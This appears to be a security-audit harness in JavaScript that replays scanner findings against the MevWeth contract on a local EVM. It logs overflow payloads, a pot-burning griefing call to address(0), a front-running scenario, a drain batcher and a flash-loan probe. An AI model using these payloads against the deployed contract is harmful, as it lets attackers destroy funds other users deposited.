// ============================================================================
// MevWeth 0x00000000008C43efC014746c230049e330039Cb3 — payload verification suite
// ----------------------------------------------------------------------------
// Compiles the genuine blunt-instruments/MevWeth source with solc 0.7.6 and
// executes every candidate payload on a local @ethereumjs EVM (Cancun rules).
// Nothing is broadcast; there is no RPC connection in this harness.
//
// For each of the 5 scanner findings this records:
//   * the exact calldata payload
//   * whether it executed or reverted
//   * attacker / victim native + token deltas (200% differential)
//   * the solvency invariant  sum(balanceOf) + mev == address(this).balance
// ============================================================================
const { VM } = require('@ethereumjs/vm');
const { Common, Hardfork } = require('@ethereumjs/common');
const { Address, hexToBytes, bytesToHex, Account } = require('@ethereumjs/util');
const { Interface, AbiCoder } = require('ethers');

const build = require('./artifacts/MevWeth.json');
const helpers = require('./artifacts/Helpers.json');
const iface = new Interface(build.abi);
const coder = AbiCoder.defaultAbiCoder();

const ONE = 10n ** 18n;
const MAX = (1n << 256n) - 1n;

const ADDR = {
  deployer: '0x1111111111111111111111111111111111111111',
  attacker: '0x000000000000000000000000000000000badc0de',
  alice: '0x2222222222222222222222222222222222222222',
  bob: '0x4444444444444444444444444444444444444444',
  probe: '0x5555555555555555555555555555555555555555',
  zero: '0x0000000000000000000000000000000000000000',
};
const TRACKED = Object.values(ADDR);

const rows = [];
const payloadLog = [];

(async () => {
  const vm = await VM.create({ common: new Common({ chain: 'mainnet', hardfork: Hardfork.Cancun }) });

  async function setBalance(addr, wei) {
    const a = new Address(hexToBytes(addr));
    const acct = (await vm.stateManager.getAccount(a)) ?? new Account();
    acct.balance = wei;
    await vm.stateManager.putAccount(a, acct);
  }
  for (const a of TRACKED) if (a !== ADDR.zero) await setBalance(a, 1000n * ONE);

  const deploy = await vm.evm.runCall({
    caller: new Address(hexToBytes(ADDR.deployer)),
    to: undefined,
    data: hexToBytes(build.bytecode),
    gasLimit: 30_000_000n,
    value: 0n,
    salt: hexToBytes('0x13061f1c1bbc52beabac07a60520c45cf18845c922387ca542de860049e90910'),
    createdAddresses: new Set(),
  });
  if (deploy.execResult.exceptionError) throw new Error('deploy: ' + deploy.execResult.exceptionError.error);
  const TARGET = bytesToHex(deploy.createdAddress.bytes);
  console.log('MevWeth deployed locally at', TARGET);

  const T = new Address(hexToBytes(TARGET));
  const at = (a) => new Address(hexToBytes(a));

  async function deployHelper(artifact, args = []) {
    const i = new Interface(artifact.abi);
    const data = artifact.bytecode + (args.length ? i.encodeDeploy(args).slice(2) : '');
    const r = await vm.evm.runCall({
      caller: at(ADDR.deployer), to: undefined, data: hexToBytes(data),
      gasLimit: 30_000_000n, value: 0n, createdAddresses: new Set(),
    });
    if (r.execResult.exceptionError) throw new Error('deploy helper: ' + r.execResult.exceptionError.error);
    return bytesToHex(r.createdAddress.bytes);
  }

  async function call(caller, to, data, value = 0n) {
    const r = await vm.evm.runCall({
      caller: at(caller), to: at(to),
      data: typeof data === 'string' ? hexToBytes(data) : data,
      gasLimit: 10_000_000n, value, createdAddresses: new Set(),
    });
    const e = r.execResult.exceptionError;
    return { ok: !e, err: e ? e.error : null, ret: bytesToHex(r.execResult.returnValue), gas: r.execResult.executionGasUsed };
  }
  async function nativeBal(a) {
    if (a === ADDR.zero) return 0n;
    const x = await vm.stateManager.getAccount(at(a));
    return x ? x.balance : 0n;
  }
  async function tokenBal(a) {
    const r = await call(ADDR.probe, TARGET, iface.encodeFunctionData('balanceOf', [a]));
    return BigInt(coder.decode(['uint256'], r.ret)[0]);
  }
  async function pot() {
    const r = await call(ADDR.probe, TARGET, iface.encodeFunctionData('mev', []));
    return BigInt(coder.decode(['uint256'], r.ret)[0]);
  }
  async function flashMinted() {
    const r = await call(ADDR.probe, TARGET, iface.encodeFunctionData('flashMinted', []));
    return BigInt(coder.decode(['uint256'], r.ret)[0]);
  }
  // solvency invariant: sum(balanceOf) + mev == ETH held + (unbacked flash mint, 0 outside a tx)
  async function invariant() {
    let sum = await pot();
    for (const a of [...TRACKED, TARGET]) sum += await tokenBal(a);
    const eth = await nativeBal(TARGET);
    const fm = await flashMinted();
    return { sum, eth, fm, ok: sum === eth + fm };
  }

  // --- realistic starting state: users deposit, someone funds an MEV pot ------
  await call(ADDR.alice, TARGET, iface.encodeFunctionData('deposit', []), 10n * ONE);
  await call(ADDR.bob, TARGET, iface.encodeFunctionData('deposit', []), 10n * ONE);
  await call(ADDR.alice, TARGET, iface.encodeFunctionData('addMev(uint256)', [3n * ONE])); // 3 ETH prize pot
  const seed = await invariant();
  console.log('seeded: ETH', seed.eth, '| mev pot', await pot(), '| invariant holds:', seed.ok, '\n');
  if (!seed.ok) throw new Error('seed invariant broken');

  async function snapshot() {
    const o = {};
    for (const a of TRACKED) { o[a] = { native: await nativeBal(a), token: await tokenBal(a) }; }
    return o;
  }

  async function scenario(id, finding, fnName, args, rationale, caller = ADDR.attacker) {
    const data = iface.encodeFunctionData(fnName, args);
    const before = await snapshot();
    const pre = await invariant();
    const potBefore = await pot();
    const res = await call(caller, TARGET, data);
    const after = await snapshot();
    const post = await invariant();

    const attackerNativeGain = after[ADDR.attacker].native - before[ADDR.attacker].native;
    const attackerTokenGain = after[ADDR.attacker].token - before[ADDR.attacker].token;
    let victimTokenLoss = 0n;
    for (const a of [ADDR.alice, ADDR.bob]) victimTokenLoss += (before[a].token - after[a].token);

    const potAfter = await pot();
    const zeroBal = after[ADDR.zero].token;
    const selfBal = after[TARGET] ? after[TARGET].token : 0n;
    const prizeDestroyed = potAfter < potBefore ? potBefore - potAfter : 0n;
    const exploitable = res.ok && (attackerTokenGain > 0n || attackerNativeGain > 0n);
    const row = {
      id, finding, selector: data.slice(0, 10), payload: data, caller,
      executed: res.ok, revert: res.err, rationale,
      attackerNativeGain: attackerNativeGain.toString(),
      attackerTokenGain: attackerTokenGain.toString(),
      victimTokenLoss: victimTokenLoss.toString(),
      potBefore: potBefore.toString(), potAfter: potAfter.toString(),
      prizeDestroyed: prizeDestroyed.toString(),
      toZeroBalance: zeroBal.toString(), toSelfBalance: selfBal.toString(),
      invariantBefore: pre.ok, invariantAfter: post.ok,
      verdict: exploitable ? 'EXPLOITABLE' : 'NOT EXPLOITABLE',
      gas: res.gas.toString(),
    };
    rows.push(row);
    payloadLog.push({ id, finding, to: TARGET, data, note: rationale });
    console.log(
      `[${row.verdict}] #${id} ${finding}\n` +
      `    call ${fnName}(${args.map(String).join(',')}) from ${caller === ADDR.attacker ? 'attacker' : caller.slice(0, 10)} -> ${res.ok ? 'OK' : 'reverted (' + res.err + ')'}\n` +
      `    attacker native +${attackerNativeGain} wei | token +${attackerTokenGain} | victims -${victimTokenLoss} | invariant ${pre.ok}->${post.ok}\n` +
      `    pot ${potBefore} -> ${potAfter} | address(0) holds ${zeroBal} | contract holds ${selfBal}`
    );
    return row;
  }

  console.log('=== Verifying the 5 scanner findings with executable payloads ===\n');

  // Finding #1 : src/MevWeth.sol:50  getMev(uint256)
  await scenario(1, 'MevWeth.getMev(uint256) @ :50', 'getMev(uint256)', [await pot() + 1n],
    'Report claims an overflow lets you claim more than the pot. Uses pot+1.');
  await scenario(1.1, 'MevWeth.getMev(uint256) @ :50', 'getMev(uint256)', [1n << 255n],
    '2^255 payload, the value the report calls "the computed wrap input".');
  await scenario(1.2, 'MevWeth.getMev(uint256) @ :50', 'getMev(uint256)', [MAX],
    'type(uint256).max payload to force a wrap of the balanceOf credit.');

  // Finding #2 : src/MevWeth.sol:65  getMev(address,uint256)
  await scenario(2, 'MevWeth.getMev(address,uint256) @ :65', 'getMev(address,uint256)', [ADDR.attacker, 1n << 255n],
    'Overflow-into-attacker payload for the 2-arg getMev.');
  await scenario(2.1, 'MevWeth.getMev(address,uint256) @ :65', 'getMev(address,uint256)', [ADDR.attacker, MAX],
    'type(uint256).max payload for the 2-arg getMev.');

  // Finding #3 : src/WETH10Mod.sol:316 transfer -> balanceOf[to] += value
  await scenario(3, 'WETH10.transfer @ :316', 'transfer(address,uint256)', [ADDR.attacker, MAX],
    'Credit-overflow payload on the recipient. Attacker holds 0 METH, so the debit guard must stop it.');
  await scenario(3.1, 'WETH10.transfer @ :316', 'transfer(address,uint256)', [ADDR.attacker, (1n << 256n) - 1n],
    'Repeat of the max payload to confirm the guard, not an accident.');

  // Finding #4 : src/WETH10Mod.sol:359 transferFrom -> balanceOf[to] += value
  await scenario(4, 'WETH10.transferFrom @ :359', 'transferFrom(address,address,uint256)', [ADDR.alice, ADDR.attacker, MAX],
    'Overflow the recipient credit by moving an impossible amount from a funded victim.');

  // Finding #5 : src/WETH10Mod.sol:389 transferAndCall -> balanceOf[to] += value
  await scenario(5, 'WETH10.transferAndCall @ :389', 'transferAndCall(address,uint256,bytes)', [ADDR.attacker, MAX, '0x'],
    'Overflow the recipient credit through the ERC677 path.');

  // --- control: prove the debit leg is what actually protects these paths -----
  console.log('\n=== Control: a legitimate transfer of a real balance still works ===');
  await scenario(100, 'CONTROL transfer of a funded balance', 'transfer(address,uint256)', [ADDR.probe, ONE],
    'Alice transfers 1 METH to a probe address - the debit/credit pair must still work.', ADDR.alice);

  // ==========================================================================
  // REAL ISSUE FOUND BY THIS REVIEW (not in the scanner report)
  // ==========================================================================
  console.log('\n=== Additional probes: is the open prize pot destroyable? ===');
  await call(ADDR.bob, TARGET, iface.encodeFunctionData('addMev(uint256)', [2n * ONE]));
  console.log('pot refilled by bob to', await pot());
  await scenario(200, 'GRIEF: getMev(address) with to=address(0)', 'getMev(address)', [ADDR.zero],
    'Anyone can name an unredeemable recipient and burn the whole prize pot at gas cost only.');
  await call(ADDR.bob, TARGET, iface.encodeFunctionData('addMev(uint256)', [2n * ONE]));
  console.log('pot refilled by bob to', await pot());
  await scenario(201, 'GRIEF: getMev(address) with to=the contract itself', 'getMev(address)', [TARGET],
    'Same via the contract address; its own balanceOf can never be withdrawn.');

  // can the contract ever redeem its own METH?  withdraw() only burns msg.sender.
  const selfBal = await tokenBal(TARGET);
  const zeroBal = await tokenBal(ADDR.zero);
  console.log('stranded METH on the contract itself :', selfBal, '(no function lets the contract spend its own balance)');
  console.log('stranded METH on address(0)          :', zeroBal, '(only withdraw()/transfer() as msg.sender could ever redeem it)');

  // ---- front-run an intended claim: attacker zeroes the pot just before a claim ----
  console.log('\n=== Front-run: destroy the pot in the block ahead of a legitimate claim ===');
  await call(ADDR.bob, TARGET, iface.encodeFunctionData('addMev(uint256)', [4n * ONE]));
  console.log('pot =', await pot());
  const aliceBefore = await tokenBal(ADDR.alice);
  await scenario(300, 'GRIEF: front-run getMev(address(0)) before a claim', 'getMev(address)', [ADDR.zero],
    'Attacker burns the pot one transaction ahead of the intended recipient.');
  const honest = await call(ADDR.alice, TARGET, iface.encodeFunctionData('getMev()', []));
  const aliceAfter = await tokenBal(ADDR.alice);
  console.log(`    honest getMev() right after -> ${honest.ok ? 'OK' : 'revert'}; alice gained ${aliceAfter - aliceBefore} METH (pot already destroyed)`);

  // ==========================================================================
  // BATCHED / SINGLE-TRANSACTION REPLAY OF THE REPORT'S STATED MECHANISM
  // ==========================================================================
  console.log('\n=== One-transaction replay: "2 receivers x 2^255" (the report\'s own wording) ===');
  const batcher = await deployHelper(helpers.Batcher, [TARGET]);
  const batcherIface = new Interface(helpers.Batcher.abi);
  const preBatch = await invariant();
  const attTokBefore = await tokenBal(ADDR.attacker);
  const b1 = await call(ADDR.attacker, batcher, batcherIface.encodeFunctionData('twoReceiversTwo255', [ADDR.attacker, ADDR.probe]));
  let acceptedFlags = null;
  if (b1.ok) acceptedFlags = coder.decode(['uint8[2]'], b1.ret)[0].map(String).join(',');
  console.log(`    two getMev(to, 2^255) calls in ONE tx -> ${b1.ok ? 'OK' : 'revert'}; per-call results [${acceptedFlags}]`);
  const b2 = await call(ADDR.attacker, batcher, batcherIface.encodeFunctionData('repeatCredit', [ADDR.attacker, 8n]));
  console.log(`    8 x getMev(to, type(uint256).max) in ONE tx -> ${b2.ok ? 'OK' : 'revert'}; accepted ${b2.ok ? coder.decode(['uint256'], b2.ret)[0] : 0n}/8`);
  await call(ADDR.bob, TARGET, iface.encodeFunctionData('addMev(uint256)', [2n * ONE])); // make claimTwice meaningful
  const potBeforeClaimTwice = await pot();
  const b3 = await call(ADDR.attacker, batcher, batcherIface.encodeFunctionData('claimTwice', []));
  const batcherTok = await tokenBal(batcher);
  console.log(`    claimTwice() in ONE tx (pot was ${potBeforeClaimTwice}) -> ${b3.ok ? 'OK' : 'revert'} ${b3.ok ? JSON.stringify(coder.decode(['uint8[2]'], b3.ret)[0].map(String)) : ''}; batcher received ${batcherTok} METH total`);
  const b4 = await call(ADDR.attacker, batcher, batcherIface.encodeFunctionData('overflowTransfer', [ADDR.attacker]));
  console.log(`    overflowTransfer(max) -> ${b4.ok ? 'OK' : 'revert'} ${b4.ok ? coder.decode(['bool'], b4.ret)[0] : ''}`);
  const b5 = await call(ADDR.attacker, batcher, batcherIface.encodeFunctionData('drain', [TARGET]));
  const attTokAfterBatch = await tokenBal(ADDR.attacker);
  const attNatAfterBatch = await nativeBal(ADDR.attacker);
  const postBatch = await invariant();
  console.log(`    drain() -> ${b5.ok ? 'OK' : 'revert'}; attacker METH ${attTokBefore} -> ${attTokAfterBatch}; invariant ${preBatch.ok} -> ${postBatch.ok}`);
  rows.push({ id: 'BATCH', finding: 'Report mechanism replay (2 receivers x 2^255)', executed: b1.ok,
    twoReceivers: acceptedFlags, repeatAccepted: b2.ok ? String(coder.decode(['uint256'], b2.ret)[0]) : '0',
    claimTwice: b3.ok ? JSON.stringify(coder.decode(['uint8[2]'], b3.ret)[0].map(String)) : '0',
    attackerTokenBefore: attTokBefore.toString(), attackerTokenAfter: attTokAfterBatch.toString(),
    attackerNativeAfter: attNatAfterBatch.toString(),
    invariantBefore: preBatch.ok, invariantAfter: postBatch.ok,
    verdict: attTokAfterBatch > attTokBefore ? 'EXPLOITABLE' : 'NOT EXPLOITABLE', gas: '0', payload: '' });

  console.log('\n=== Additional: totalSupply() accounting (documented as ETH balance + flashMinted) ===');
  const supplyRes = await call(ADDR.probe, TARGET, iface.encodeFunctionData('totalSupply', []));
  const supply = BigInt(coder.decode(['uint256'], supplyRes.ret)[0]);
  const inv2 = await invariant();
  console.log(`    totalSupply() = ${supply} | ETH balance = ${inv2.eth} | sum(balanceOf)+mev = ${inv2.sum} | flashMinted = ${inv2.fm}`);
  console.log(`    accounting consistent: ${supply === inv2.eth + inv2.fm} (documented formula) | sum(balanceOf)+mev == totalSupply: ${inv2.sum === supply}`);

  console.log('\n=== Additional: can a flash mint be laundered into real ETH? (ERC-3156) ===');
  const fl = await deployHelper(helpers.FlashProbe, [TARGET]);
  const flIface = new Interface(helpers.FlashProbe.abi);
  const ethBeforeFlash = await nativeBal(ADDR.attacker);
  const f1 = await call(ADDR.attacker, fl, flIface.encodeFunctionData('go', [5n * ONE]));
  const ethAfterFlash = await nativeBal(ADDR.attacker);
  console.log(`    flashLoan(5 ETH) + withdraw-in-callback -> ${f1.ok ? 'OK' : 'reverted (' + f1.err + ')'}; attacker native delta ${ethAfterFlash - ethBeforeFlash}`);

  console.log('\n=== Cost of a pot sweep (getMev(address(0))) ===');
  await call(ADDR.bob, TARGET, iface.encodeFunctionData('addMev(uint256)', [ONE]));
  const gsweep = await call(ADDR.attacker, TARGET, iface.encodeFunctionData('getMev(address)', [ADDR.zero]));
  const gclaim = await call(ADDR.attacker, TARGET, iface.encodeFunctionData('getMev()', []));
  console.log(`    sweep to address(0): ${gsweep.gas} gas | honest claim: ${gclaim.gas} gas (same order, no capital required)`);

  console.log('\n=== FINAL ===');
  const exp = rows.filter((r) => r.verdict === 'EXPLOITABLE');
  console.log('payloads executed:', rows.length, '| exploitable:', exp.length);
  for (const r of exp) console.log('  EXPLOITABLE:', r.id, r.finding, 'token gain', r.attackerTokenGain);
  const invBroken = rows.filter((r) => !r.invariantAfter);
  console.log('invariant breaks:', invBroken.length);

  require('fs').writeFileSync(__dirname + '/artifacts/payload_results.json', JSON.stringify({ target: TARGET, rows }, null, 2));
  require('fs').writeFileSync(__dirname + '/artifacts/payloads.json', JSON.stringify(payloadLog, null, 2));
  console.log('wrote build/payload_results.json and build/payloads.json');
})().catch((e) => { console.error('HARNESS ERROR', e); process.exit(1); });
